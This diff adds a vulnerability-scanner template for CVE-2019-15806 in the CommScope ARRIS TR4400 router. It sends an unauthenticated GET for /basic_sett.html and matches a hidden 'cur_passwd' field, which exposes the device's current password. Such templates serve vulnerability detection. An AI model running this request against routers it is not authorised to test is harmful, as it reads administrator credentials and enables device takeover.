@@ -1,0 +1,25 @@
+id: CVE-2019-15806
+info:
+  name: CommScope ARRIS TR4400 Wireless Router Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Sensitive information disclosure vulnerability in CommScope ARRIS TR4400 wireless router. Attackers can read sensitive system information via a specially crafted URL.
+  reference:
+    - https://medium.com/@v.roberthoutenbrink/commscope-vulnerability-authentication-bypass-in-arris-tr4400-firmware-version-a1-00-004-180301-4a90aa8e7570
+  tags: information-disclosure
+
+http:
+  - raw:
+      - |
+        GET /basic_sett.html HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "<input\\s+type=\\\"hidden\\\"\\s+name=\\\"cur_passwd\\\"\\s+value=\\\".*?\\\""
